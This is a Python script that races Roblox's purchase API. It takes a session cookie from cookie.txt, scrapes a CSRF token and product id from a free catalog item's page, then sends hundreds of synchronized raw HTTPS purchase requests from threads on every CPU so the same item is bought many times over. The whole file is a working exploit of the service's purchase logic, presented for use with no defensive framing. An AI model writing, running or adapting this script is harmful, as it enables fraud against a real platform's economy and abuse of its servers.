import multiprocessing
import threading
import requests
import re
import time
import socket
import ssl
import sys
if sys.platform == "linux":
    from os import sched_setaffinity
    set_affinity = lambda x: sched_setaffinity(0, x)
elif sys.platform == "win32":
    from win32process import SetProcessAffinityMask
    set_affinity = lambda x: SetProcessAffinityMask(-1, 1 << x)
else:
    exit(f"'{sys.platform}' is not a supported platform")

if __name__ == "__main__":
    CPUS = multiprocessing.cpu_count()
    PROCESSES_PER_CPU = 1
    THREADS_PER_PROCESS = 100
    START_DELAY = 10

def thread_func(start_ts, request):
    global loc_success_count
    global loc_total_count

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(start_ts-time.time())
        sock.connect(("economy.roblox.com", 443))
        sock = ssl.create_default_context().wrap_socket(
            sock, server_hostname="economy.roblox.com")
        
        delay = start_ts-time.time()
        if 0 > delay:
            return
            
        time.sleep(delay)
        sock.send(request)

        if b'{"purchased":true' in sock.recv(1024**2):
            loc_success_count += 1
        loc_total_count += 1
    except:
        pass
    finally:
        try:
            sock.close(socket.SHUT_RDWR)
        except:
            pass
        sock.close()
    
def worker_func(cpu_num, thread_count, success_count, total_count, lock,
                *thread_args):
    set_affinity(cpu_num)
    
    global loc_success_count
    global loc_total_count
    loc_success_count = 0
    loc_total_count = 0

    threads = [
        threading.Thread(
            target=thread_func,
            args=(*thread_args,)
        )
        for _ in range(thread_count)
    ]

    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    with lock:
        success_count.value += loc_success_count
        total_count.value += loc_total_count
    
if __name__ == "__main__":
    # load cookie
    try:
        with open("cookie.txt") as fp:
            cookie = fp.read().strip().split("|_")[-1]
            if not cookie:
                exit("cookie.txt is empty")
            if not re.match("[A-F0-9]{100,1000}$", cookie):
                exit("cookie format is not valid")
    except FileNotFoundError:
        exit("cookie.txt must be present")

    # asset id prompt
    if len(sys.argv) > 1:
        asset_id = sys.argv[1]
    else:
        asset_id = input("asset id (or url): ").strip()
    if asset_id.lower().startswith("http"):
        asset_id = asset_id.split("/")[4]
    if not asset_id.isdigit():
        exit(f"'{asset_id}' is not a valid id nor url")

    # csrf token and item details
    with requests.Session() as session:
        session.headers["User-Agent"] = "Roblox/WinInet"
        session.cookies.set(".ROBLOSECURITY", cookie, domain="roblox.com")
        resp = session.get(f"https://www.roblox.com/catalog/{asset_id}/--")

        if "<span>Item Owned</span>" in resp.text:
            exit("this item is already owned")
        elif not "data-userid" in resp.text:
            exit("cookie is not valid")
        elif "disabled=\"\"" in resp.text:
            exit("item cannot be bought")
        elif not re.search("data-expected-price=\"?0\"?", resp.text):
            exit("item must be free")

        csrf_token = re.search("data-token=\"?([\w/+]+)\"?", resp.text).group(1)
        product_id = re.search("data-product-id=\"?(\d+)\"?", resp.text).group(1)
        seller_id = re.search("data-expected-seller-id=\"?(\d+)\"?", resp.text).group(1)
        del resp
        del session

    # craft request
    request = f"POST /v1/purchases/products/{product_id} HTTP/1.1\r\n"
    request += "Host: economy.roblox.com\r\n"
    request += "Content-Type: application/json\r\n"
    request += "Content-Length: 2\r\n"
    request += f"X-CSRF-TOKEN: {csrf_token}\r\n"
    request += f"Cookie: .ROBLOSECURITY={cookie}\r\n"
    request += "\r\n"
    request += "{}"
    request = request.encode()
    
    # start workers
    manager = multiprocessing.Manager()
    lock = manager.Lock()
    total_count = manager.Value("i", 0)
    success_count = manager.Value("i", 0)
    start_ts = time.time() + START_DELAY
    workers = [
        multiprocessing.Process(
            target=worker_func,
            args=(
                cpu_num,
                THREADS_PER_PROCESS,
                success_count,
                total_count,
                lock,
                start_ts,
                request
            )
        )
        for _ in range(PROCESSES_PER_CPU)
        for cpu_num in range(CPUS)
    ]
    for worker in workers:
        worker.start()
    for worker in workers:
        worker.join()
    
    success_pnt = 100 * float(success_count.value)/float(total_count.value)
    print(f"bought {success_count.value} times ({success_pnt:.2f}% accuracy)")